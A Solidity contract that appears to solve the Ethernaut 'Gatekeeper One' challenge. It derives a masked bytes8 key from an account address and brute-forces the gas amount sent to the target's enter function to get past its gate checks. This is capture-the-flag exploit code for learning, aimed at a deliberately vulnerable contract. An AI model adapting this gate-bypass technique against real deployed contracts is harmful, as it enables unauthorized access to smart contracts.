// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GateKeeperOne.sol";

contract AreYouTheKeymaster{
    using SafeMath for uint256;
    bytes8 txOrigin16 = 0xe75706e6B3bEa1c5; //last 16 digits of your account
    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF; 
    GatekeeperOne public gkpOne;

 
    function setGatekeeperOne(address _addr) public{
        gkpOne = GatekeeperOne(_addr);
    }
    
    function letMeIn() public{
         for (uint256 i = 0; i < 120; i++) {
        (bool result,) = address(gkpOne).call{gas:
          i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", key)); // thanks to Spalladino https://github.com/OpenZeppelin/ethernaut/blob/solidity-05/contracts/attacks/GatekeeperOneAttack.sol
      if(result)
        {
        break;
      }
    }
  }
        
    
}